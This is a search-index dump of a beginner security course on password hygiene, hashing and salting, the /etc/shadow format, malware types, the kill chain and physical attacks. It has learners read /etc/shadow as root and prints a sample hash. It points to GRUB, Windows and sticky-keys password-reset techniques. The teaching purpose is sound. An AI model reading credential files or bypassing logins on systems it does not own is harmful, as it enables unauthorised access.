{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction Hopper's Roppers is a website dedicated to providing the best training possible for students who are new to the field. One of the ways that we do this is through a series of free courses. This is the full text of our Technical Security Fundamentals course. This course will not teach you how to be a hacker or a pentester but is the first hands-on lessons you need to build the mental models. Low on theory, high on practical application, this is a bunch of fun and you'll learn a lot. This site is generated from a course hosted at: [https://www.roppers.org/courses/technical-security-fundamentals] All the material is available here, but in order to get the full benefits of our course we recommend registering so that we can track your progress, grade your submissions, and provide feedback and support when you need it. If you have any questions, hit us on Twitter @roppersacademy. If you have recommended changes or feedback, this is all available on GitHub for anyone to submit issues or pull requests. Thanks for the help! Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/0-Introduction.html":{"url":"SecureYourselfNow/0-Introduction.html","title":"Introduction","keywords":"","body":"Introduction Hey! I'm Dennis, the person behind Hopper's Roppers. This is the Roppers Practical Security Fundamentals course. To the best of my knowledge, it is the only security theory course out there that focuses on practical application. Its sister course, Roppers Security Fundamentals focuses on the theory behind security, and you should complete that before starting this one. Promise it goes fast. If you do that course first there is a small amount of overlap for the topics I think are critical, but no need to waste time, when you come upon duplicated material just read it real fast and keep moving. This course is about technical ability, not theory. These courses together will teach students about risk, threat modeling, and how they can defend themselves and others online. You've gotten most of the theory in the previous course, this course is about teaching practical skills backed up by theory; not advanced persistent threats and fighting off malware. This course doesn't have an official place in the roadmap I use to guide students toward the best resources available. Still, it is an essential part of your development as a security professional. Pre-Requisites Our Computing Fundamentals course is recommended, but not required. This is technical and will require an understanding of Linux and the command line. Roppers Security Fundamentals is highly recommended as it goes over the theory behind what we are doing here. Welcome to the show! Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/1-Passwords.html":{"url":"SecureYourselfNow/1-Passwords.html","title":"Passwords","keywords":"","body":"Passwords HaveIBeenPwned You probably know this already, you are orders of magnitude more likely to have your password stolen in a data breach than by a bad guy sniffing your traffic or breaking into your computer. As mentioned before, when people get hacked on the internet, they are incidental victims much more often than targeted. When a site is breached and the emails and passwords leak themselves onto the net, the next thing that happens is called password stuffing, where scripts will attempt to login to 1000s of sites using all of those email and password combos. If it works, you just lost your account. This means that reusing a password, no matter how \"strong\" it is, is only as secure as the least secure site that you use that password on. If they get breached, your password is out there on the internet, and if you used the same password for your email, you might be about to have a very bad day. So before we tackle the problem of password reuse, it's time for you to check if any of your accounts have been found in a publicly available data breach. If they have and your password was compromised, you should start changing anything that shares a password before someone else does, no matter how long ago in the past the breach may have occurred. Check out https://haveibeenpwned.com/ a badass website run by the good guys. Don't freak out too hard if you find your accounts have been breached, it's normal these days, but it's time to take steps to secure yourself. Password Manager My first recommendation is to start using a password manager such as LastPass, Keepass, or 1Password. Even Apple and Google have built-in ones for your browser these days. If you haven't heard of them before, what password managers do is recommend randomized passwords to you when you sign up to a site, store the password, and then autofill the password for you when you are logging in to the site the next time. This is very helpful because the human brain can only remember so many passwords, which leads us to reuse passwords across different sites. The problem with this is that if you use the same password on all of your accounts if someone steals that password at one site, they now have the ability to log into any of your accounts. Password managers help you maintain track of a bunch of strong, unique passwords, which limits the most likely threat that you have online. If you don't like trusting random internet people who tell you to download things in the first 5 minutes they know you, good call: I respect that. If you trust me, I recommend using LastPass (though it is paid now). There's plenty of other great password managers out there, but I've been using this one forever and that is the main reason I recommend it. Convince your friends and family to use password managers. Again, I totally get if you don't want to do this now, just skip it. If you want to learn more about password managers, check this link out. If you take nothing else away from this course, just start using a password manager. It will make your life easier and you will be more secure. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/2-WhoisTrackingYou.html":{"url":"SecureYourselfNow/2-WhoisTrackingYou.html","title":"Who is Tracking You","keywords":"","body":"Who is Tracking You? A famous quote about the internet is “If a service is free, the product is you”. this applies from social media to news sites to free antivirus. (If you're wondering why this site is free, I'm using all my students to improve this curriculum so that I can find a way to become a millionaire someday. Silicon Valley is built on advertising money, and they make their money by targeting advertisements. The more targeted, the more money they can charge. It isn't always advertisements though. Anything can be turned into a dataset from pictures of your face, your conversations, any behavioral feature, or things like what you buy and what malware you download. You probably have heard of cookies, but if you want a little bit more information, here's a link. If I had to guess, you probably have also heard you should be running an ad-blocker. If you still aren't and need some more convincing, check out this article. If you want to see what is tracking you right now on various sites, install the Ghostery extension. It's a pretty cool visual, and you can manually update permissions, however, it isn't a full adblocker. Your second task, if you do not already have one installed, is to install an ad-blocking extension. Ad-blockers do what they say they do, making your web experience more visually attractive and faster, but also block trackers and lessen the chance of getting malware-laden ads. For Chrome, I recommend uBlock Origin. I don't use Firefox, but it has an ad-blocker built-in which makes it one of the best choices for the privacy and security conscious. I also recommend installing Chrome and ad-blockers (or Firefox) on as many computers of friends and family that you do tech support for. Again, if you don't want to do this now, skip it. So now you've got adblockers installed, you're good right? Check out what someone can learn about you just from you visiting a website. http://www.whatsmyip.org/more-info-about-you/ I don't care much for VPNs because I don't care about ad tracking and I'm not in a country where I worry about my internet browsing being monitored and getting taken away by the secret police. You don't need a VPN for security no matter how many people are taking marketing money to sell them (use my code \"youdontneedavpn\" for 100% off!). As long as you are using HTTPS sites and not clicking through bad certificates, you shouldn't have to worry about getting your credit card or passwords stolen no matter how sketchy the public wifi you're on is. If you reeeally want one for privacy, I trust Nord VPN and use them when I'm in countries that annoy me by blocking random parts of the internet. Okay, so now you're behind a VPN and you have ad-block on. You're good now, right? Well, check out how well you can be uniquely fingerprinted just based on your browser. The EFF are the good guys, so they made this site to raise awareness. https://panopticlick.eff.org/tracker What's the answer here, other than that it is very hard not to be tracked on the internet? Keep building awareness, raising your level of security, keep your online personas compartmentalized, and know that the internet is probably not out to get you specifically, but that doesn't mean they aren't trying to take advantage of you. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/3-UpdateYourComputerandScan.html":{"url":"SecureYourselfNow/3-UpdateYourComputerandScan.html","title":"Update Your Computer and Scan","keywords":"","body":"Update Your Computer and Scan No seriously, stop pressing snooze on that update button. The single best thing you can do for your computer, and all the computers you are in charge of is to turn on auto-update and forget about them. They are significantly more secure when they can receive updates on time. If your computer isn't updated, restart now and apply updates, this course can wait. While you're doing that, update all the computers you are responsible for. You're a tech person now so get ahead of your family members breaking their internet boxes. The same goes for browsers and other applications. We'll learn a bit more about exploits later in the course, but for now, just know that sometimes vulnerabilities can open up your computer to attack. By patching as soon as updates come out you can lower that window of vulnerability. You always like to assume you don't already have malware on your computer but if you are working off of a shared computer, there are no guarantees. First, ensure that Windows Defender is enabled. If it isn't, turn it on. Once again, do this on as many computers as you are responsible for. I don't really recommend adding 3rd party antivirus solutions these days because Defender is so good (notably Defender does not uninstall spamware or other programs that are annoying, just not malicious). If you believe that your computer has some sort of malware on it but Windows Defender isn't removing it, run MalwareBytes and see what if anything is detected. I'm a huge fan of their free product but don't leave it constantly running in the background. If MalwareBytes and Windows say you're good, you're probably good. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/4-UpdatingYourLab.html":{"url":"SecureYourselfNow/4-UpdatingYourLab.html","title":"Updating Your Lab","keywords":"","body":"Updating Your Lab Hey there! If you are already familiar with the contents of the Fundamentals course and are using your old lab with Ubuntu or any other non-cybersecurity-focused distribution… It is time to upgrade your lab! 🧑‍💻 Why? There is a lot to learn and the time you have is limited, ideally, you want to spend as much time learning and spend a lot less setting things up. - Some sections in this course and beyond (advanced courses) may require your machine to have some specialized tools which are not available on the distro by default and are neither available on their universal repositories, in order to install them and update them you will have to manually. - Locate their repositories - Add them to your system repository database - Ensure compatibility between what is used and what is available - So, it is time to upgrade your hacking lab OS to a more cybersecurity-focused distro: Kali Linux Kali Linux Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics, and Reverse Engineering. Installation guide - Use this link to download and install Kali Linux on your machine according to your needs. Use the Slack channel for any help or assistance required. You can surely choose to go your own path and install tools as required, but honestly just don’t waste your time and energy over petty issues unless you absolutely want to tinker and learn by breaking and fixing things through trial and error. Shoutout to @map for identifying that this section needed to exist and writing it! If you are ever going through these courses and want to contribute, just hit me up! Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecureYourselfNow/6-JoinourChatRooms.html":{"url":"SecureYourselfNow/6-JoinourChatRooms.html","title":"Join our Chat Rooms","keywords":"","body":"Join our Chat Room(s) Click here to register for our Slack where you can ask questions and meet other students! Say hi to everyone in #helloworld! https://join.slack.com/t/hoppersroppers/shared_invite/zt-uqpgyl1e-wbZxSflcPsxQHmauT3TnNA Checking In Communication is key in life, whether that is talking to your friends, getting advice, or writing blog posts to share what you know. Roppers is proud to have a Slack channel named #checkups, that is a dedicated space for people to talk about their journeys in life, whether that is educational, professional, or in their personal lives. You are more than welcome to use this channel to discuss mental health topics. If you are just looking to say hello and introduce yourself, use the channel #helloworld. If you just want to talk about something random, #random is perfect for that. Everybody deserves to have a place to vent or to get advice, and we're happy to provide one. Let me know any questions or comments in feedback for this section, or check it out in our Slack at #checkups! Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"Passwords/0-Hashing.html":{"url":"Passwords/0-Hashing.html","title":"Hashing","keywords":"","body":"Hashing A good deal of security is based around the idea of confidentiality, that someone who is not authorized to read something can't read it. We discussed the idea of permissions earlier, where someone who is not authorized to read something is simply not granted access to it by a computer, but there are situations in which we need to send or otherwise expose sensitive data. To allow data to be exposed without authentication, we need a way to protect that sensitive information from people who don't know some sort of secret. This is where math comes in. There are two primary ways to protect the confidentiality of secret information: Encryption and hashing. Let's go into each a little bit, but we will focus on hashing here. Encryption Encryption is something you've definitely heard of before, it's the lock on HTTPS websites, it's what we are supposed to do with sensitive files before we send them via email, it's everywhere. Encryption, at it's fundamental level, is doing math and having some sort of shared secret between the sender and the receiver that any adversary who is listening in doesn't have, so the sender can encrypt and the receiver can decrypt, and the adversary doesn't know anything other than that a message got sent. There's a ton to learn about the study of encryption which is known as cryptography, and I have a giant section in my CTF course about it if you want to learn more. Encoding and Obfuscation One big giant step down from encryption is encoding and obfuscation. While they might look like encryption, they are really just ways of translating data into another form. While you might need to spend some time figuring out how it is obfuscated or encoded, there is no math involved so it is far from secret. Encoding is notably not always a security measure, and can be used to get data into an acceptable format for transfer. One common example is Base64 encoding, which can be used to convert a binary into printable ASCII text. Hashing Finally, we get to hashing, the star of this lesson. Hashing is what we use if we wanted to encrypt something so that it could never be decrypted again. What does that mean, you're probably thinking. Hashes are designed to be mathematically one way, meaning it is impossible to reverse a hash into the data that was used to create it. Hashing functions are algorithms that take in any data, do math on it, and output a string of some set length depending on the function, that can be assumed to be unique to whatever the input was. To put it another way, no two inputs should result in the same output hash (that doesn't mean it's impossible, and it's very interesting when it does, but that is outside the scope of this course). Let's play around with hashing to try and get an idea of what this means. One of the more famous hashing algorithms is md5, so we'll use the 'md5sum' utility that should be included on your Linux machine. Run this command, which takes the string \"password\" and gets the md5 hash of it. $ echo \"password\" | md5sum Now, run this command. $ echo \"password1\" | md5sum As you can see, the outputs are completely different. We can also use hashing on files and programs. $ md5sum /bin/ls This will give us the unique hash of the 'ls' program. If a single bit in the program changes, the hash will be completely different. This is used by many software companies when they distribute software to verify the integrity of their software, as it allows downloaders to verify the hash to make sure the file they received is not corrupted. So hashing is interesting and one way, but doesn't that mean everyone in the world who gets the md5 hash of \"password\" has the same value? Absolutely. For a fun check, google the hash of 'password' and you'll find that it is everywhere. What does that mean then, that we can't use the password \"password\" anymore because someone can view hashes, crack them using a dictionary of common words, and then use it to log in? Well you shouldn't use common words, but that's not actually much of a problem because of something known as salting. Salting Salting is a very cool technique where a computer or website creates a unique string to place at the end of every password entered.This means that they can leave their hashes publicly readable, but an attacker is going to have a much harder time cracking them. Let's demo this, as if we were a user setting their password for the first time on a system with hashing enabled. $ echo \"password&secretsalt1337\" | md5sum So here we are emulating as if the user entered their new password \"password\", the system added on a salt, in this case \"&secretsalt1337\", and then the system saves the salt and the output of the md5 hash. The original password entered will not be saved anywhere. Now the next time when you enter your password, it will be combined with the salt stored on file, hashed, and then the hash will be compared to the hash on file, not any stored password. We'll come back to this later, but it's 2021, there is no excuse to be storing someone else's password. /etc/shadow As we showed earlier, modern Linux versions don't store passwords in /etc/passwd. Instead, they have been moved to /etc/shadow. So now, guess we just have to cat /etc/shadow instead, right? If you have been paying attention to this course so far, you probably guessed that wouldn't work. If you check the permissions, in order to read /etc/passwd, we need root access. So now we try it with superuser privileges and we should see the results. There should be a bunch of entries, but let's break one down. dennis:$6$iU9KjTeD$5myyo4W7zppTOEdVUeP8/E6Kmjl7CtYYFqIIyes.fnNHy1fR0gJLb0q2KLhjAH6KrPpHZ0eJorBh.D74mq.vQ.:17952:0:99999:7::: Briefly read through the man page for \"shadow\" and see the breakdown: man shadow The most notable part of this is the password field, field #2. To break it out, we can see that it is represented by: :$6$iU9KjTeD$5myyo4W7zppTOEdVUeP8/E6Kmjl7CtYYFqIIyes.fnNHy1fR0gJLb0q2KLhjAH6KrPpHZ0eJorBh.D74mq.vQ.: Notably, you can't actually read the password! Let's break this field down ever further: $6 This represents the hashing mechanism we are using to generate the hash from this password $iU9KjTeD This represents the randomly generated salt used Remember how we were talking about salts earlier? In Linux, the salt is randomly generated for the user when they are created. These salts are different for each user. $5myyo4W7zppTOEdVUeP8... This is the resulting hash of taking the user's password and the randomly generated salt When a user types in a password, the OS takes the input, adds the salt that is saved in /etc/shadow, hashes the string, and then compares the output to the saved hash in /etc/shadow. If the hashes match, access is granted. So you might be asking, what is the salt for if an attacker can figure out what it is, and then run a dictionary of common passwords against it, to create a bunch of hashes, then compare those hashes to the hash saved in /etc/shadow? Well, the answer is that it is super inefficient to do that for every user. Without salts, attackers would only need one giant list of hashes to check against. With salts, for every user they need to run a new cracker against the hash. That is technically difficult and expensive enough that very few attackers will ever take the time to do that for your password. You're just not special enough, which is a good thing. Beyond this format, there are a few other characters that can be saved in an /etc/shadow password field. The use of \"!\" or \"*\" in this field indicates that the account cannot be logged into using a password, and must instead be logged into using an alternate method, such as an SSH key. This minimizes risk by forcing an attacker to know or have something besides a simple password. As a note, on modern Linux systems there are a variety of authentication methods (usually known as PAM) which use /etc/shadow in various ways. They are outside of the scope of this course, if you ever find yourself in a job that focuses on Linux auth, blame me for not teaching you more... and then teach yourself. Assignment: What is in /etc/shadow? Describe how hashing, salting, and cracking work from the perspective of a defender. Break down this entry from /etc/shadow. Describe each field. especially focusing on the password field. dennis:$6$iU9KjTeD$5myyo4W7zppTOEdVUeP8/E6Kmjl7CtYYFqIIyes.fnNHy1fR0gJLb0q2KLhjAH6KrPpHZ0eJorBh.D74mq.vQ.:17952:0:99999:7::: Create an account, set the password, check the password in /etc/shadow. Then lock the account using usermod, check the password again. Now, unlock the account, you will have to Google or use man pages for this. Check /etc/shadow again. Briefly write up what you saw and any problems you had doing this. Answer in the appropriate format. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"Passwords/1-CrackingPasswords.html":{"url":"Passwords/1-CrackingPasswords.html","title":"Cracking Passwords","keywords":"","body":"Cracking Passwords The reasons why you need a good password are complicated, but a large part of it is the ability for people to crack passwords or bruteforce passwords. Even seemingly complicated passwords can be cracked extremely quickly. Do the following lesson on TryHackMe to practice brute forcing and cracking hashes. Brute It - Learn how to brute, hash cracking and escalate privileges Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/0-NetworkArchitectureNotes.html":{"url":"HowHackingWorks/0-NetworkArchitectureNotes.html","title":"Network Architecture Notes","keywords":"","body":"Network Architecture Notes Alright fine, you know what time it is. We're at the fun part where we get to learn about malware, how the bad guys get in and the good guys stop them. But first, networking vocab! This is a very short section that we will make longer in the future, but for now, it'll do. You don't need to know networking, just what these words mean. Modem A modem converts data into a signal at the end of a wire. I.e., converts bits into waves or waves to bits. Modem is short for \"modulator demodulator\". Router Router is a gateway for a device to the Internet. It distributes packets to different devices on a network, or between computer networks. A router can also manipulate the data coming through it, repackaging it, or analyzing it. Switch A switch is like a simple router. It connects to devices on a LAN, receives packets, and distributes them to their destinations. The switch connects to devices via ethernet, either in input or output ports. It reads data on the input ports and sends it out on the output ports. Firewall A firewall is a piece of software running on a personal computer or network server which monitors incoming traffic and determines what is allowed through. DMZ A Demilitarized Zone is a screened subnet where one's Internet facing activities take place. Proxy A proxy (server) is is an intermediary server that your internet traffic is funneled through. This makes it so that from the destination's perspective, the traffic is coming from the proxy server and not your server. Endpoint/Host A Host or Endpoint is a computer connected to a network. It can receive packets from other hosts. Server A server is a computer on a network that sends packets to other devices on the network. The server usually runs some kind of software for managing the network. For example, an email program where clients can connect and check their email. A server provides services to clients. Web Application A web application is a piece of software accessed via a web browser, rather than a discrete computer on a network. Clients can connect via the Internet instead of a LAN. Domain Controller A domain controller is a server that authenticates users on a network or domain. Use google if you don't understand any of these terms. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/1-CyberKillchain.html":{"url":"HowHackingWorks/1-CyberKillchain.html","title":"Cyber Killchain","keywords":"","body":"Cyber Killchain So how has security adapted to face all these threats? Basically, the most modern idea is the idea of defense in depth, making it so the bad guys have to beat layer after layer of security in order to get in, and then back out. The go-to model is the cyber killchain by Lockheed Martin, and while it gets a ton of crap, it is honestly a very good way of looking at it. Cyber Kill Chain Document Make sure you know the different layers of the killchain. Write a sentence describing each and provide an example. If you can't think of examples, google for them. Don't worry too much about being right. Recon Weaponization Delivery Exploitation Installation Command and Control Actions on Objectives Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/2-PostExploitation.html":{"url":"HowHackingWorks/2-PostExploitation.html","title":"PostExploitation","keywords":"","body":"Post-Exploitation One of the most common arguments against the killchain is that \"Actions on Objectives\" is too vague. For one, all of the other steps of the killchain can occur as an action on objective if the attacker uses it to attack something else, which is known as pivoting. But there are many other \"post-exploitation\" objectives of an attacker, which range from installing backdoors to bricking the device. There are 5 P's of Post-Exploitation: Persistence = Find a way to maintain access Privilege Escalation = Find a way to get a higher level of access than you already have Pilfer = Steal things Pillage = Break things. Pivot = Move from one box to another and start the killchain all over again. I will write a good post on this at some point, but for now, just try to remember what each of those things means. Task: Describe a hypothetical attack on a user via email, using your current understanding, from recon all the way through all the post exploitation possibilities. It is fine if you don't have the technical understanding, we are just trying to make sure you have the concepts down. You are going to look back at this scenario later in the course and do it again, once you have more technical concepts down. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/3-MalwareTypes.html":{"url":"HowHackingWorks/3-MalwareTypes.html","title":"Malware Types","keywords":"","body":"Malware Types For all intents and purposes, malware and virus mean the same thing. There are many types of malware out there, which have many different purposes. Read this: a href=\"http://www.veracode.com/blog/2012/10/common-malware-types-cybersecurity-101\" rel=\"noopener\" target=\"_blank\"http://www.veracode.com/blog/2012/10/common-malware-types-cybersecurity-101 Worm Self-replicating malware typically spread over networks. Can contain a payload that damages the host computer, or install another piece of malware. Vulnerability Exploitation Tool A tool used by adversaries to take advantage of a known exploit by injecting malicious code, payloads, encoders, no-op generators, etc. into otherwise normal-looking programs. Software that is used for finding and exploiting vulnerabilities. Exploit Scanner A piece of software that searches a target for vulnerabilities. E.g. a port scanner Remote Access Tool (RAT)/Implant/Spyware A piece of software that allows an adversary remote access to the victim's machine. Such a tool could be installed by a worm, by a phishing email, or by the attacker having physical access to the machine. Dropper/Loader A dropper or loader is the software that puts the malware onto the target system and launches it. It is designed to be a more subtle installation and go unnoticed by the user. E.g. a RAT client with capabilities to install programs on a remote machine. Trojan Software that, to the victim, looks perfectly safe and normal, but actually contains malicious intent. Once the victim installs the trojan, their computer is now infected with the malware. Ransomware This malware locks up some sensitive info of the victim's and holds it for ransom. It could threaten to erase the hard drive, delete sensitive info, send sensitive info to others, blackmail, etc. until the victim pays the attacker's ransom. Wipers Malware which completely wipes the hard drive of the victim's machine. Could be delivered by worm, trojan, dropper, etc. Webshell A background script running on the victim's machine which allows control or administration of the box. Typically also allows access to files on the victim's box. Scareware Fake alerts telling the victim they have a virus, then asking the victim to buy some (likely fake) malware/virus removal tool. This is generally used to get the victim's credit card info. Scareware could be deployed via a pop-up ad, email, or trojan. Adware Software that displays ads to the user. The ads may run malicious code if clicked prompting the user to download a trojan, or just capture their email for phishing attacks. Rootkit A rootkit is malware that gives the attacker admin access to the victim's machine, giving them root access to the operating system, unbeknownst to the victim. Bootkit Similar to a rootkit, but can access the master boot record. This enables the bootkit to alter startup commands and infect other computer components (e.g. hard drive, motherboard BIOS). Bots A bot is a machine infected by malware that executes a specific task over and over again. Bots are often part of a bot-net, a collection of bots working towards the same goal. A machine can become infected/turn into a bot via trojan horse, a phishing email, visiting a malicious website, or having a bot physically installed on the machine. DDOS/Booter An active attempt to take down a victim's machine. Conducted remotely by the attacker, or could be executed by a botnet. It overwhelms the victim's machine with requests such that the machine shuts down and goes offline, is unusable, etc. Miners I miner is a type of bot that uses the victim's machine to mine cryptocurrency for the attacker. This takes up resources on the victim's machine, slowing it down or perhaps taking it over completely. Potentially unwanted programs(PUP)/ Browser \"Helpers\"/Shareware Shareware is software generally provided for free, and which user of are encouraged to share. The shareware may contain a trojan, turning their computer into a bot, or infect their machine with some other kind of virus. FUD /Crypter FUD malware is malware that is FullyUnDetectable. These typically include root/boot kits, web shells, and perhaps worms. Crypters are used to make malware FUD, or at least obfuscate it from the victim. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/4-JobRolesRedvsBlue.html":{"url":"HowHackingWorks/4-JobRolesRedvsBlue.html","title":"Job Roles  Red vs Blue","keywords":"","body":"Job Roles - Red vs Blue No, not the classic Halo video series. In this section we are going to talk about the different jobs that are out there, just briefly enough to pique your interest and give you context for future lessons, and then I will move on. This is in no way an attempt to provide a full list of jobs that are available. Red Team In this simplified world of ours, Red Team means offense and Blue means defense. Well, I'll say this one up front: Everyone wants to be red team, but there aren't any jobs for it... because it is fun as hell. Plus, you should know how to defend first because otherwise how the hell will you know what you are hiding from. (Oh I know this section will piss people off) Operator The most pure form of offense, somebody gives you a tool, a target, and you put hands on keyboard. Basically no legal jobs exist for this outside of the government. Network Penetration Tester (Pentester) It's like being an operator, but instead of hacking a target, you're paid to focus on a specific organization during what is a called a \"pentest\" to identify their assets, attack them, and write a report on your findings. It's like hacking, if you spent the entire time writing documentation. Physical Penetration Tester Like being a network pentester but you try to break into buildings, and usually it involves a lot of lying (which you call \"social engineering\" because you're a professional). Web Application Pentester It's like being a network pentester, but you look exclusively for vulnerabilities in webapps and attempt to prove impact. Then you write it up and give the exploits and bugs to whoever is paying you. If no one is paying you, then you can try to do the bug bounty thing and compete with everyone else on the internet. Tool Developer The people who build the tools required for operators and pentesters to do their jobs. For the most part, these people work for pentest companies and release their tools as content marketing for everyone else to use. And by everyone else, I mean criminals. Great marketing, you clowns. Exploit Developer The people who write exploits on various pieces of software and then distribute working exploits to operators, pentesters, and often the company or software project itself so they can fix the bugs. Blue This is where all the hard work is, where the free world is protected, and the money gets made. Yes, this is where the vast majority of the jobs are. Plus it's way more fun to work at the top of your field legally. Red teams just LARP being operators. SysAdmins, Helpdesk, and Network Engineers This is the front line of defense, and possibly the most important one. Anyone in these roles is in a security job, whether they want to or not. Security Engineer These are the people who attempt to architect the network, systems, and policies so that attackers have a harder time stealing everything. Security Analyst The people who look at logs and alerts and defend the network from attackers, 24/7. This is where most of the jobs are and what you should focus on. Incident Response (IR) These are the people who the security analysts call when they've detected a breach and need to respond to it. Digital Forensic Analyst Often combined with Incident Response in the acronym DFIR, these are the people the IR folks call when they need to find out what happened on a network at some point in the past. Malware Analyst These are the people who spend their time reverse engineering malware samples that the other analysts find. Threat Analyst / Threat Intel These are the people who provide actionable intelligence to everyone else on what the bad guys are doing. Auditing and Compliance/Governance and Policy These are the people who ensure that the security engineers are doing the right things Identity and Access Management These are the people who ensure that the right people are logging in to the right places securely. In a big company, this is absolutely critical. Secure Development While more of a subset of development, some developers are exclusively focused on making secure software, using specific processes, tools, and sometimes dedicated hardware. If every developer was an expert in secure development there'd be a lot less jobs for all the people listed above. Tool Developer The people who write the tools required for everyone else to do their jobs. Alright, hopefully I didn't piss anyone off too bad with this rundown. I'll be referencing these individuals as I go forward and talk about different common attacks. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/5-PhishingCaseStudy.html":{"url":"HowHackingWorks/5-PhishingCaseStudy.html","title":"Phishing Case Study","keywords":"","body":"Phishing Case Study Pen Test is short for penetration testing, which basically means breaking into someone's stuff in order to help make them more secure by identifying vulnerabilities and helping to fix them. In the civilian world, you can do this for a job. While the military has \"red teams\" which perform attacks on friendly networks to help make our defenses better, the rest of the military who does this kind of work usually doesn't tell the people they hack how to make their systems more secure....Mostly because those people have already had all their stuff stolen/hit hellfire missile/shot. But I digress. On the second page of this cool poster, learn about a sample network pen test. Read this: a href=\"https://www.sans.org/security-resources/posters/pen-test-attack-surfaces-tools-techniques/70/download\" rel=\"noopener\" target=\"_blank\"https://www.sans.org/security-resources/posters/pen-test-attack-surfaces-tools-techniques/70/download For anything you do not understand, look it up. If looking up doesn't explain that specific item well in >5 minutes, add your question to your question list and write it at the bottom of your submission. Task: In your own words, describe what happened using the kill chain. Don't worry about getting it wrong for now, we'll teach you how to do this eventually. In addition, write out whatever questions you have about this and we'll answer them. You will be doing this for a few more scenarios, the point of writing out how this happened is so we can help you if you misunderstand things, as well as answer your questions. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"HowHackingWorks/6-ManMachineintheMiddle.html":{"url":"HowHackingWorks/6-ManMachineintheMiddle.html","title":"ManMachine in the Middle","keywords":"","body":"Man/Machine in the Middle If you've got encryption on, that certainly doesn't mean your safe from all attacks, the most notable being a man in the middle or, more recently named, machine in the middle attack. You may have heard this before, and you'll hear it plenty more as it is the easiest and most common network attack. The general idea is that if Computer A tries to communicate with Computer C, but their conversation transits over Computer B, B is able to read and even alter the messages being sent. This can allow Computer B to impersonate both people to each other and have them each receive a totally incorrect message while never knowing that they are being listened in on. This was not a huge problem back in the '70s on ARPANET, but now, when there are dozens of hops between your computer and whatever website you visit, any of those could be intercepting your traffic (and mostly likely multiple are). Read this: https://www.networxsecurity.org/members-area/glossary/m/mitma.html Questions to think about: Of CIA, what were the pillars that can be attacked if an adversary is able to do a machine in the middle? In the Computer A,B and C scenario, what are the human names which match up to them? This one requires a google, but who is Mallory, and what makes her different from Eve? How does your browser protect you from MITM attacks? This will require a google. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"RealWorld/0-LinuxPasswordReset.html":{"url":"RealWorld/0-LinuxPasswordReset.html","title":"Linux Password Reset","keywords":"","body":"Linux Password Reset To demonstrate how easy it is to break into a computer you have physical access to we are going to do a password reset on your Linux VM you should have set up in the Computing Fundamentals course. This will be the same for the vast majority of Linux Operating Systems, but a general rule is that you can just Google how to do it for the OS you are on. I actually had to do this attack the week before I wrote this section because I accidentally corrupted the password file on my box (protip: don't test the rootkit you are writing on your actual machine) and couldn't get back in. Had to do this reset to make a new account and recover everything. See! Hacking is Useful! This maneuver is generally known as a \"Grub Bootloader attack\". Here is a starting point. https://itsfoss.com/how-to-hack-ubuntu-password/ Write a couple sentences about what you learned from this. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"RealWorld/1-WindowsPasswordReset.html":{"url":"RealWorld/1-WindowsPasswordReset.html","title":"Windows Password Reset","keywords":"","body":"Windows Password Reset Linux?! Well that was easy, now its time for Windows! There are a ton of ways to do this, most of which rely on booting to a disc or USB, then modifying the password from there. a href=\"https://www.top-password.com/knowledge/reset-windows-10-password.html\" rel=\"noopener\" target=\"_blank\"https://www.top-password.com/knowledge/reset-windows-10-password.html A way that is more entertaining is the stickykeys or \"sethc\" reset. It worked on all default Windows installs for years but finally got more complicated. You'll figure out why that is. This is a lot more complicated, so we won't do it. The only assignment for this one is to write a short description of how stickykeys resets used to work, and why it doesn't work now. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"RealWorld/2-TechnicalAttacks.html":{"url":"RealWorld/2-TechnicalAttacks.html","title":"Technical Attacks","keywords":"","body":"Technical Attacks In the last section, I discussed the idea of data minimization to avoid casual, non-technical invasions of privacy. But what about the uncommon attacks, done by someone who knows what they are doing? So let's say you work off a TrueCrypt partition with Full Disc Encryption. What risks remain? Rubber Hose Cryptography Taking you and your computer and forcing you to give up password: https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis Some encryption tools allow the possibility of multiple partitions so that multiple passwords can be used. Only one password unlocks what you are actually trying to hide, others open different partitions, and there is no way of proving that there are multiple partition/password pairs... this doesn't work very well legally but might work. A little bit. There are plenty of legal issues surrounding forced password disclosure. In the US, there is more constitutional law in this field than you ever expected. In the rest of the world, it's kind of a toss up based on how much the place you're in likes democracy. Biometrics If your device unlocks with anything on your body, they can just take you and open your stuff. Fingerprint/retina/voice/face unlocks are not protected by Constitution, they can just make you unlock these things if they have you. If you are in a \"not chill\" country, then doubly so. Tackling you off of the computer while logged in Read this: \"They got DPR, they gonna find you\". They didn't need to tackle him, but they were very effective. What if he had gotten the computer turned off? Read about Cold Boot attacks. While this sounds hard, I've done one before in a competition to recover FDE keys and it was actually pretty easy. Evil Maid and Black Bag Cryptanalysis Black bagging can be used to describe an operation where you break into a physical location and do something for intelligence purposes. ALong those same lines, a physical attack on your computer, called an \"Evil Maid\", is a classic attack and near impossible to defeat. If you leave your computer alone for any period of time and a professional can tamper with it, you're going to be compromised. Even with full disc encryption and a secure bootloader, if someone modifies the hardware and you use it, then you are still screwed. This can be throwing a new chip in your computer, throwing a keylogger in your keyboard firmware, or really anything you can think of. Read this: F-Secure Evil Maid Guide Where does an evil maid attack fall into your personal threat model? 